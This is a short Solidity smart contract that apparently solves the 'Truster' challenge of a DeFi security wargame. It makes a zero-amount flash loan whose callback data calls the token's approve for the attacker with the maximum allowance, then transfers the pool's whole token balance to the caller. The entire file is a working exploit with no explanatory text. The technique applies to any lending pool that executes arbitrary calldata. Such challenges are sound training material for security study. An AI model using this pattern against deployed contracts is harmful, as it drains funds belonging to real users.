// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "hardhat/console.sol";
contract TrusterLenderPoolAttacker {
    TrusterLenderPool pool;

    constructor(TrusterLenderPool _pool) {
        pool = _pool;
    }

    function attack() external {
        uint256 amount = 0;
        address borrower = address(this);
        address target = address(pool.token());  
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this),type(uint).max);
        pool.flashLoan(amount, borrower, target, data);
        pool.token().transferFrom(address(pool), msg.sender, pool.token().balanceOf(address(pool)));
        require(pool.token().balanceOf(address(pool)) == 0, "Attack failed");
    }
}